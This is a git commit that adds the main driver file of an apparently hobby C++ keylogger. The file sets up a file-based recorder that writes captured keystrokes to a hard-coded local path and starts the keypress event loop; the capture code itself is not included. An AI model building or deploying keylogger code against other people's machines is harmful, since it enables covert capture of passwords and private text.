058f76ab81e8af1a92d91a1f1165c6afe5f2e297
ivan-guerra <ivan.eduardo.guerra@gmail.com>
2023-11-05 13:04:49 -0800

    Add the program driver.

---
+++ src/keylogger/keylogger.cpp
@@ -0,0 +1,43 @@
+#include <cstdlib>
+#include <exception>
+#include <iostream>
+#include <memory>
+
+#include "recorder/event_loop.h"
+#include "recorder/recorder.h"
+
+enum RecorderType {
+  kText = 0,
+};
+
+#define RECORDER_KEY_LIMIT 8
+#define RECORDER_TYPE RecorderType::kText
+
+#define RECORDER_FILE_PATH "/home/ieg/dev/keylogger/bin/keys.txt"
+
+void PrintErrAndExit(const std::string& err_msg) {
+  std::cerr << "error: " << err_msg << std::endl;
+  std::exit(EXIT_FAILURE);
+}
+
+int main() {
+  using RecorderPtr = std::unique_ptr<keylogger::Recorder>;
+  RecorderPtr recorder;
+  switch (RECORDER_TYPE) {
+    case RecorderType::kText:
+      recorder = std::make_unique<keylogger::FileRecorder>(RECORDER_KEY_LIMIT,
+                                                           RECORDER_FILE_PATH);
+      break;
+    default:
+      PrintErrAndExit("unknown recorder type -> " +
+                      std::to_string(RECORDER_TYPE));
+  }
+
+  try {
+    keylogger::RecordKeypressEvents(recorder.get());
+  } catch (const std::exception& e) {
+    PrintErrAndExit(e.what());
+  }
+
+  std::exit(EXIT_SUCCESS);
+}
